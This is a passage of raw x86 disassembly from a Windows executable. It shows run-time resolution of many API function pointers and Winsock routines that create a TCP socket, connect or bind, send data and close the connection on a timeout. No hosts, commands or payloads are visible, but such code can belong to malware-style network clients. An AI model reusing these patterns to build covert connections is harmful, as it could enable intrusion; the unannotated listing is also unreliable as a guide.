  40207f:	ff 15 04 90 40 00    	call   *0x409004
  402085:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402088:	89 81 2c 01 00 00    	mov    %eax,0x12c(%ecx)
  40208e:	68 2c 93 40 00       	push   $0x40932c
  402093:	68 40 98 40 00       	push   $0x409840
  402098:	ff 15 08 90 40 00    	call   *0x409008
  40209e:	50                   	push   %eax
  40209f:	ff 15 04 90 40 00    	call   *0x409004
  4020a5:	8b 55 08             	mov    0x8(%ebp),%edx
  4020a8:	89 82 30 01 00 00    	mov    %eax,0x130(%edx)
  4020ae:	68 20 93 40 00       	push   $0x409320
  4020b3:	ff 15 00 90 40 00    	call   *0x409000
  4020b9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4020bc:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4020c0:	0f 84 a8 00 00 00    	je     0x40216e
  4020c6:	68 18 93 40 00       	push   $0x409318
  4020cb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4020ce:	50                   	push   %eax
  4020cf:	ff 15 04 90 40 00    	call   *0x409004
  4020d5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4020d8:	89 81 34 01 00 00    	mov    %eax,0x134(%ecx)
  4020de:	68 0c 93 40 00       	push   $0x40930c
  4020e3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4020e6:	52                   	push   %edx
  4020e7:	ff 15 04 90 40 00    	call   *0x409004
  4020ed:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4020f0:	89 81 38 01 00 00    	mov    %eax,0x138(%ecx)
  4020f6:	68 f8 92 40 00       	push   $0x4092f8
  4020fb:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4020fe:	52                   	push   %edx
  4020ff:	ff 15 04 90 40 00    	call   *0x409004
  402105:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402108:	89 81 3c 01 00 00    	mov    %eax,0x13c(%ecx)
  40210e:	68 e8 92 40 00       	push   $0x4092e8
  402113:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402116:	52                   	push   %edx
  402117:	ff 15 04 90 40 00    	call   *0x409004
  40211d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402120:	89 81 40 01 00 00    	mov    %eax,0x140(%ecx)
  402126:	68 dc 92 40 00       	push   $0x4092dc
  40212b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40212e:	52                   	push   %edx
  40212f:	ff 15 04 90 40 00    	call   *0x409004
  402135:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402138:	89 81 44 01 00 00    	mov    %eax,0x144(%ecx)
  40213e:	68 d0 92 40 00       	push   $0x4092d0
  402143:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402146:	52                   	push   %edx
  402147:	ff 15 04 90 40 00    	call   *0x409004
  40214d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402150:	89 81 48 01 00 00    	mov    %eax,0x148(%ecx)
  402156:	68 c4 92 40 00       	push   $0x4092c4
  40215b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40215e:	52                   	push   %edx
  40215f:	ff 15 04 90 40 00    	call   *0x409004
  402165:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402168:	89 81 4c 01 00 00    	mov    %eax,0x14c(%ecx)
  40216e:	68 b8 92 40 00       	push   $0x4092b8
  402173:	ff 15 00 90 40 00    	call   *0x409000
  402179:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40217c:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402180:	0f 84 38 01 00 00    	je     0x4022be
  402186:	68 a8 92 40 00       	push   $0x4092a8
  40218b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40218e:	52                   	push   %edx
  40218f:	ff 15 04 90 40 00    	call   *0x409004
  402195:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402198:	89 81 50 01 00 00    	mov    %eax,0x150(%ecx)
  40219e:	68 9c 92 40 00       	push   $0x40929c
  4021a3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4021a6:	52                   	push   %edx
  4021a7:	ff 15 04 90 40 00    	call   *0x409004
  4021ad:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4021b0:	89 81 54 01 00 00    	mov    %eax,0x154(%ecx)
  4021b6:	68 8c 92 40 00       	push   $0x40928c
  4021bb:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4021be:	52                   	push   %edx
  4021bf:	ff 15 04 90 40 00    	call   *0x409004
  4021c5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4021c8:	89 81 58 01 00 00    	mov    %eax,0x158(%ecx)
  4021ce:	68 7c 92 40 00       	push   $0x40927c
  4021d3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4021d6:	52                   	push   %edx
  4021d7:	ff 15 04 90 40 00    	call   *0x409004
  4021dd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4021e0:	89 81 5c 01 00 00    	mov    %eax,0x15c(%ecx)
  4021e6:	68 70 92 40 00       	push   $0x409270
  4021eb:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4021ee:	52                   	push   %edx
  4021ef:	ff 15 04 90 40 00    	call   *0x409004
  4021f5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4021f8:	89 81 60 01 00 00    	mov    %eax,0x160(%ecx)
  4021fe:	68 64 92 40 00       	push   $0x409264
  402203:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402206:	52                   	push   %edx
  402207:	ff 15 04 90 40 00    	call   *0x409004
  40220d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402210:	89 81 64 01 00 00    	mov    %eax,0x164(%ecx)
  402216:	68 50 92 40 00       	push   $0x409250
  40221b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40221e:	52                   	push   %edx
  40221f:	ff 15 04 90 40 00    	call   *0x409004
  402225:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402228:	89 81 68 01 00 00    	mov    %eax,0x168(%ecx)
  40222e:	68 40 92 40 00       	push   $0x409240
  402233:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402236:	52                   	push   %edx
  402237:	ff 15 04 90 40 00    	call   *0x409004
  40223d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402240:	89 81 6c 01 00 00    	mov    %eax,0x16c(%ecx)
  402246:	68 28 92 40 00       	push   $0x409228
  40224b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40224e:	52                   	push   %edx
  40224f:	ff 15 04 90 40 00    	call   *0x409004
  402255:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402258:	89 81 70 01 00 00    	mov    %eax,0x170(%ecx)
  40225e:	68 18 92 40 00       	push   $0x409218
  402263:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402266:	52                   	push   %edx
  402267:	ff 15 04 90 40 00    	call   *0x409004
  40226d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402270:	89 81 74 01 00 00    	mov    %eax,0x174(%ecx)
  402276:	68 10 92 40 00       	push   $0x409210
  40227b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40227e:	52                   	push   %edx
  40227f:	ff 15 04 90 40 00    	call   *0x409004
  402285:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402288:	89 81 78 01 00 00    	mov    %eax,0x178(%ecx)
  40228e:	68 04 92 40 00       	push   $0x409204
  402293:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402296:	52                   	push   %edx
  402297:	ff 15 04 90 40 00    	call   *0x409004
  40229d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4022a0:	89 81 7c 01 00 00    	mov    %eax,0x17c(%ecx)
  4022a6:	68 f4 91 40 00       	push   $0x4091f4
  4022ab:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4022ae:	52                   	push   %edx
  4022af:	ff 15 04 90 40 00    	call   *0x409004
  4022b5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4022b8:	89 81 80 01 00 00    	mov    %eax,0x180(%ecx)
  4022be:	8b 55 08             	mov    0x8(%ebp),%edx
  4022c1:	83 7a 70 00          	cmpl   $0x0,0x70(%edx)
  4022c5:	74 10                	je     0x4022d7
  4022c7:	68 64 96 40 00       	push   $0x409664
  4022cc:	ff 15 00 90 40 00    	call   *0x409000
  4022d2:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4022d5:	eb 07                	jmp    0x4022de
  4022d7:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4022de:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4022e1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4022e4:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4022e8:	74 18                	je     0x402302
  4022ea:	68 e4 91 40 00       	push   $0x4091e4
  4022ef:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4022f2:	51                   	push   %ecx
  4022f3:	ff 15 04 90 40 00    	call   *0x409004
  4022f9:	8b 55 08             	mov    0x8(%ebp),%edx
  4022fc:	89 82 84 01 00 00    	mov    %eax,0x184(%edx)
  402302:	b8 01 00 00 00       	mov    $0x1,%eax
  402307:	8b e5                	mov    %ebp,%esp
  402309:	5d                   	pop    %ebp
  40230a:	c3                   	ret
  40230b:	cc                   	int3
  40230c:	cc                   	int3
  40230d:	cc                   	int3
  40230e:	cc                   	int3
  40230f:	cc                   	int3
  402310:	55                   	push   %ebp
  402311:	8b ec                	mov    %esp,%ebp
  402313:	83 ec 30             	sub    $0x30,%esp
  402316:	56                   	push   %esi
  402317:	8b 45 08             	mov    0x8(%ebp),%eax
  40231a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40231d:	6a 00                	push   $0x0
  40231f:	ff 15 98 90 40 00    	call   *0x409098
  402325:	83 c4 04             	add    $0x4,%esp
  402328:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40232b:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40232e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402335:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402339:	75 6c                	jne    0x4023a7
  40233b:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40233e:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  402342:	74 11                	je     0x402355
  402344:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402347:	c7 42 0c 01 00 00 00 	movl   $0x1,0xc(%edx)
  40234e:	33 c0                	xor    %eax,%eax
  402350:	e9 a2 00 00 00       	jmp    0x4023f7
  402355:	6a 01                	push   $0x1
  402357:	ff 15 f8 d6 40 00    	call   *0x40d6f8
  40235d:	6a 00                	push   $0x0
  40235f:	ff 15 98 90 40 00    	call   *0x409098
  402365:	83 c4 04             	add    $0x4,%esp
  402368:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40236b:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40236e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402371:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  402374:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  402377:	1b 75 f4             	sbb    -0xc(%ebp),%esi
  40237a:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40237d:	8b 02                	mov    (%edx),%eax
  40237f:	99                   	cltd
  402380:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402383:	89 75 dc             	mov    %esi,-0x24(%ebp)
  402386:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402389:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  40238c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40238f:	3b 45 d4             	cmp    -0x2c(%ebp),%eax
  402392:	7c 11                	jl     0x4023a5
  402394:	7f 08                	jg     0x40239e
  402396:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402399:	3b 4d d0             	cmp    -0x30(%ebp),%ecx
  40239c:	76 07                	jbe    0x4023a5
  40239e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4023a5:	eb 8e                	jmp    0x402335
  4023a7:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4023aa:	83 7a 08 00          	cmpl   $0x0,0x8(%edx)
  4023ae:	74 0e                	je     0x4023be
  4023b0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4023b3:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  4023ba:	33 c0                	xor    %eax,%eax
  4023bc:	eb 39                	jmp    0x4023f7
  4023be:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4023c1:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  4023c5:	74 24                	je     0x4023eb
  4023c7:	6a 00                	push   $0x0
  4023c9:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4023cc:	8b 42 04             	mov    0x4(%edx),%eax
  4023cf:	50                   	push   %eax
  4023d0:	ff 15 68 91 40 00    	call   *0x409168
  4023d6:	6a 05                	push   $0x5
  4023d8:	ff 15 f8 d6 40 00    	call   *0x40d6f8
  4023de:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4023e1:	8b 51 04             	mov    0x4(%ecx),%edx
  4023e4:	52                   	push   %edx
  4023e5:	ff 15 6c 91 40 00    	call   *0x40916c
  4023eb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4023ee:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  4023f5:	33 c0                	xor    %eax,%eax
  4023f7:	5e                   	pop    %esi
  4023f8:	8b e5                	mov    %ebp,%esp
  4023fa:	5d                   	pop    %ebp
  4023fb:	c2 04 00             	ret    $0x4
  4023fe:	cc                   	int3
  4023ff:	cc                   	int3
  402400:	55                   	push   %ebp
  402401:	8b ec                	mov    %esp,%ebp
  402403:	81 ec a0 01 00 00    	sub    $0x1a0,%esp
  402409:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  402410:	b8 01 00 00 00       	mov    $0x1,%eax
  402415:	66 89 45 f0          	mov    %ax,-0x10(%ebp)
  402419:	b9 02 00 00 00       	mov    $0x2,%ecx
  40241e:	66 89 4d f4          	mov    %cx,-0xc(%ebp)
  402422:	0f b7 55 f0          	movzwl -0x10(%ebp),%edx
  402426:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40242c:	0f b6 c2             	movzbl %dl,%eax
  40242f:	0f b7 4d f4          	movzwl -0xc(%ebp),%ecx
  402433:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402439:	0f b6 d1             	movzbl %cl,%edx
  40243c:	c1 e2 08             	shl    $0x8,%edx
  40243f:	0b c2                	or     %edx,%eax
  402441:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  402445:	8d 85 60 fe ff ff    	lea    -0x1a0(%ebp),%eax
  40244b:	50                   	push   %eax
  40244c:	0f b7 4d fc          	movzwl -0x4(%ebp),%ecx
  402450:	51                   	push   %ecx
  402451:	ff 15 64 91 40 00    	call   *0x409164
  402457:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40245a:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40245e:	74 04                	je     0x402464
  402460:	33 c0                	xor    %eax,%eax
  402462:	eb 05                	jmp    0x402469
  402464:	b8 01 00 00 00       	mov    $0x1,%eax
  402469:	8b e5                	mov    %ebp,%esp
  40246b:	5d                   	pop    %ebp
  40246c:	c3                   	ret
  40246d:	cc                   	int3
  40246e:	cc                   	int3
  40246f:	cc                   	int3
  402470:	55                   	push   %ebp
  402471:	8b ec                	mov    %esp,%ebp
  402473:	ff 15 60 91 40 00    	call   *0x409160
  402479:	f7 d8                	neg    %eax
  40247b:	1b c0                	sbb    %eax,%eax
  40247d:	83 c0 01             	add    $0x1,%eax
  402480:	5d                   	pop    %ebp
  402481:	c3                   	ret
  402482:	cc                   	int3
  402483:	cc                   	int3
  402484:	cc                   	int3
  402485:	cc                   	int3
  402486:	cc                   	int3
  402487:	cc                   	int3
  402488:	cc                   	int3
  402489:	cc                   	int3
  40248a:	cc                   	int3
  40248b:	cc                   	int3
  40248c:	cc                   	int3
  40248d:	cc                   	int3
  40248e:	cc                   	int3
  40248f:	cc                   	int3
  402490:	55                   	push   %ebp
  402491:	8b ec                	mov    %esp,%ebp
  402493:	83 ec 08             	sub    $0x8,%esp
  402496:	6a 01                	push   $0x1
  402498:	6a 00                	push   $0x0
  40249a:	6a 00                	push   $0x0
  40249c:	6a 00                	push   $0x0
  40249e:	6a 01                	push   $0x1
  4024a0:	6a 02                	push   $0x2
  4024a2:	ff 15 5c 91 40 00    	call   *0x40915c
  4024a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024ab:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%ebp)
  4024af:	75 09                	jne    0x4024ba
  4024b1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4024b8:	eb 0e                	jmp    0x4024c8
  4024ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4024bd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4024c0:	89 08                	mov    %ecx,(%eax)
  4024c2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4024c5:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4024c8:	b8 01 00 00 00       	mov    $0x1,%eax
  4024cd:	8b e5                	mov    %ebp,%esp
  4024cf:	5d                   	pop    %ebp
  4024d0:	c2 04 00             	ret    $0x4
  4024d3:	cc                   	int3
  4024d4:	cc                   	int3
  4024d5:	cc                   	int3
  4024d6:	cc                   	int3
  4024d7:	cc                   	int3
  4024d8:	cc                   	int3
  4024d9:	cc                   	int3
  4024da:	cc                   	int3
  4024db:	cc                   	int3
  4024dc:	cc                   	int3
  4024dd:	cc                   	int3
  4024de:	cc                   	int3
  4024df:	cc                   	int3
  4024e0:	55                   	push   %ebp
  4024e1:	8b ec                	mov    %esp,%ebp
  4024e3:	83 ec 10             	sub    $0x10,%esp
  4024e6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4024ed:	b8 02 00 00 00       	mov    $0x2,%eax
  4024f2:	66 89 45 f0          	mov    %ax,-0x10(%ebp)
  4024f6:	0f b7 4d 0c          	movzwl 0xc(%ebp),%ecx
  4024fa:	51                   	push   %ecx
  4024fb:	ff 15 54 91 40 00    	call   *0x409154
  402501:	66 89 45 f2          	mov    %ax,-0xe(%ebp)
  402505:	6a 10                	push   $0x10
  402507:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40250a:	52                   	push   %edx
  40250b:	8b 45 08             	mov    0x8(%ebp),%eax
  40250e:	50                   	push   %eax
  40250f:	ff 15 58 91 40 00    	call   *0x409158
  402515:	33 c9                	xor    %ecx,%ecx
  402517:	83 f8 ff             	cmp    $0xffffffff,%eax
  40251a:	0f 95 c1             	setne  %cl
  40251d:	8b c1                	mov    %ecx,%eax
  40251f:	8b e5                	mov    %ebp,%esp
  402521:	5d                   	pop    %ebp
  402522:	c2 08 00             	ret    $0x8
  402525:	cc                   	int3
  402526:	cc                   	int3
  402527:	cc                   	int3
  402528:	cc                   	int3
  402529:	cc                   	int3
  40252a:	cc                   	int3
  40252b:	cc                   	int3
  40252c:	cc                   	int3
  40252d:	cc                   	int3
  40252e:	cc                   	int3
  40252f:	cc                   	int3
  402530:	55                   	push   %ebp
  402531:	8b ec                	mov    %esp,%ebp
  402533:	83 ec 10             	sub    $0x10,%esp
  402536:	8b 45 0c             	mov    0xc(%ebp),%eax
  402539:	50                   	push   %eax
  40253a:	ff 15 4c 91 40 00    	call   *0x40914c
  402540:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402543:	b9 02 00 00 00       	mov    $0x2,%ecx
  402548:	66 89 4d f0          	mov    %cx,-0x10(%ebp)
  40254c:	0f b7 55 10          	movzwl 0x10(%ebp),%edx
  402550:	52                   	push   %edx
  402551:	ff 15 54 91 40 00    	call   *0x409154
  402557:	66 89 45 f2          	mov    %ax,-0xe(%ebp)
  40255b:	6a 10                	push   $0x10
  40255d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402560:	50                   	push   %eax
  402561:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402564:	51                   	push   %ecx
  402565:	ff 15 50 91 40 00    	call   *0x409150
  40256b:	33 d2                	xor    %edx,%edx
  40256d:	83 f8 ff             	cmp    $0xffffffff,%eax
  402570:	0f 95 c2             	setne  %dl
  402573:	8b c2                	mov    %edx,%eax
  402575:	8b e5                	mov    %ebp,%esp
  402577:	5d                   	pop    %ebp
  402578:	c2 0c 00             	ret    $0xc
  40257b:	cc                   	int3
  40257c:	cc                   	int3
  40257d:	cc                   	int3
  40257e:	cc                   	int3
  40257f:	cc                   	int3
  402580:	55                   	push   %ebp
  402581:	8b ec                	mov    %esp,%ebp
  402583:	83 ec 28             	sub    $0x28,%esp
  402586:	e8 55 01 00 00       	call   0x4026e0
  40258b:	c7 45 e8 14 00 00 00 	movl   $0x14,-0x18(%ebp)
  402592:	8b 45 08             	mov    0x8(%ebp),%eax
  402595:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402598:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40259f:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4025a6:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4025a9:	51                   	push   %ecx
  4025aa:	6a 00                	push   $0x0
  4025ac:	8d 55 e8             	lea    -0x18(%ebp),%edx
  4025af:	52                   	push   %edx
  4025b0:	68 10 23 40 00       	push   $0x402310
  4025b5:	6a 00                	push   $0x0
  4025b7:	6a 00                	push   $0x0
  4025b9:	ff 15 08 d6 40 00    	call   *0x40d608
  4025bf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4025c2:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4025c6:	75 08                	jne    0x4025d0
  4025c8:	83 c8 ff             	or     $0xffffffff,%eax
  4025cb:	e9 04 01 00 00       	jmp    0x4026d4
  4025d0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4025d7:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  4025db:	0f 84 d9 00 00 00    	je     0x4026ba
  4025e1:	8b 45 10             	mov    0x10(%ebp),%eax
  4025e4:	83 c0 03             	add    $0x3,%eax
  4025e7:	50                   	push   %eax
  4025e8:	e8 6b 53 00 00       	call   0x407958
  4025ed:	83 c4 04             	add    $0x4,%esp
  4025f0:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4025f3:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4025f6:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4025f9:	8b 55 10             	mov    0x10(%ebp),%edx
  4025fc:	83 c2 03             	add    $0x3,%edx
  4025ff:	52                   	push   %edx
  402600:	6a 00                	push   $0x0
  402602:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402605:	50                   	push   %eax
  402606:	e8 09 53 00 00       	call   0x407914
  40260b:	83 c4 0c             	add    $0xc,%esp
  40260e:	0f b6 4d 14          	movzbl 0x14(%ebp),%ecx
  402612:	85 c9                	test   %ecx,%ecx
  402614:	75 39                	jne    0x40264f
  402616:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40261a:	74 2a                	je     0x402646
  40261c:	83 7d 18 01          	cmpl   $0x1,0x18(%ebp)
  402620:	75 09                	jne    0x40262b
  402622:	8b 55 10             	mov    0x10(%ebp),%edx
  402625:	83 c2 01             	add    $0x1,%edx
  402628:	89 55 10             	mov    %edx,0x10(%ebp)
  40262b:	8b 45 18             	mov    0x18(%ebp),%eax
  40262e:	50                   	push   %eax
  40262f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402632:	51                   	push   %ecx
  402633:	8b 55 0c             	mov    0xc(%ebp),%edx
  402636:	52                   	push   %edx
  402637:	8b 45 08             	mov    0x8(%ebp),%eax
  40263a:	50                   	push   %eax
  40263b:	ff 15 48 91 40 00    	call   *0x409148
  402641:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402644:	eb 07                	jmp    0x40264d
  402646:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40264d:	eb 59                	jmp    0x4026a8
  40264f:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402652:	8a 55 14             	mov    0x14(%ebp),%dl
  402655:	88 11                	mov    %dl,(%ecx)
  402657:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40265b:	74 19                	je     0x402676
  40265d:	8b 45 10             	mov    0x10(%ebp),%eax
  402660:	50                   	push   %eax
  402661:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402664:	51                   	push   %ecx
  402665:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402668:	83 c2 01             	add    $0x1,%edx
  40266b:	52                   	push   %edx
  40266c:	e8 e1 52 00 00       	call   0x407952
  402671:	83 c4 0c             	add    $0xc,%esp
  402674:	eb 07                	jmp    0x40267d
  402676:	c7 45 10 00 00 00 00 	movl   $0x0,0x10(%ebp)
  40267d:	83 7d 18 01          	cmpl   $0x1,0x18(%ebp)
  402681:	75 09                	jne    0x40268c
  402683:	8b 45 10             	mov    0x10(%ebp),%eax
  402686:	83 c0 01             	add    $0x1,%eax
  402689:	89 45 10             	mov    %eax,0x10(%ebp)
  40268c:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40268f:	51                   	push   %ecx
  402690:	8b 55 10             	mov    0x10(%ebp),%edx
  402693:	83 c2 01             	add    $0x1,%edx
  402696:	52                   	push   %edx
  402697:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40269a:	50                   	push   %eax
  40269b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40269e:	51                   	push   %ecx
  40269f:	ff 15 48 91 40 00    	call   *0x409148
  4026a5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4026a8:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4026ab:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4026ae:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4026b1:	50                   	push   %eax
  4026b2:	e8 95 52 00 00       	call   0x40794c
  4026b7:	83 c4 04             	add    $0x4,%esp
  4026ba:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4026c1:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4026c5:	75 0a                	jne    0x4026d1
  4026c7:	6a 01                	push   $0x1
  4026c9:	ff 15 f8 d6 40 00    	call   *0x40d6f8
  4026cf:	eb f0                	jmp    0x4026c1
  4026d1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4026d4:	8b e5                	mov    %ebp,%esp
  4026d6:	5d                   	pop    %ebp
  4026d7:	c2 14 00             	ret    $0x14
  4026da:	cc                   	int3
  4026db:	cc                   	int3
  4026dc:	cc                   	int3
  4026dd:	cc                   	int3
  4026de:	cc                   	int3
  4026df:	cc                   	int3
  4026e0:	55                   	push   %ebp
  4026e1:	8b ec                	mov    %esp,%ebp
  4026e3:	83 3d 68 d7 40 00 00 	cmpl   $0x0,0x40d768
  4026ea:	75 17                	jne    0x402703
  4026ec:	68 e0 d5 40 00       	push   $0x40d5e0
  4026f1:	e8 ba f0 ff ff       	call   0x4017b0
  4026f6:	83 c4 04             	add    $0x4,%esp
  4026f9:	c7 05 68 d7 40 00 01 	movl   $0x1,0x40d768
  402700:	00 00 00 
  402703:	5d                   	pop    %ebp
  402704:	c3                   	ret
  402705:	cc                   	int3
  402706:	cc                   	int3
  402707:	cc                   	int3
  402708:	cc                   	int3
  402709:	cc                   	int3
  40270a:	cc                   	int3
  40270b:	cc                   	int3
  40270c:	cc                   	int3
  40270d:	cc                   	int3
  40270e:	cc                   	int3
  40270f:	cc                   	int3
  402710:	55                   	push   %ebp
  402711:	8b ec                	mov    %esp,%ebp
  402713:	51                   	push   %ecx
  402714:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40271b:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  40271f:	74 2f                	je     0x402750
  402721:	8b 45 18             	mov    0x18(%ebp),%eax
  402724:	50                   	push   %eax
  402725:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402728:	51                   	push   %ecx
  402729:	8b 55 0c             	mov    0xc(%ebp),%edx
  40272c:	52                   	push   %edx
  40272d:	8b 45 08             	mov    0x8(%ebp),%eax
  402730:	50                   	push   %eax
  402731:	ff 15 44 91 40 00    	call   *0x409144
  402737:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40273a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40273e:	7e 10                	jle    0x402750
  402740:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  402744:	74 0a                	je     0x402750
  402746:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402749:	8b 55 0c             	mov    0xc(%ebp),%edx
  40274c:	8a 02                	mov    (%edx),%al
  40274e:	88 01                	mov    %al,(%ecx)
  402750:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402753:	8b e5                	mov    %ebp,%esp
  402755:	5d                   	pop    %ebp
  402756:	c2 14 00             	ret    $0x14
  402759:	cc                   	int3
  40275a:	cc                   	int3
  40275b:	cc                   	int3
  40275c:	cc                   	int3
  40275d:	cc                   	int3
  40275e:	cc                   	int3
  40275f:	cc                   	int3
  402760:	55                   	push   %ebp
  402761:	8b ec                	mov    %esp,%ebp
  402763:	68 ff ff ff 7f       	push   $0x7fffffff
  402768:	8b 45 08             	mov    0x8(%ebp),%eax
  40276b:	50                   	push   %eax
  40276c:	ff 15 40 91 40 00    	call   *0x409140
  402772:	f7 d8                	neg    %eax
  402774:	1b c0                	sbb    %eax,%eax
  402776:	83 c0 01             	add    $0x1,%eax
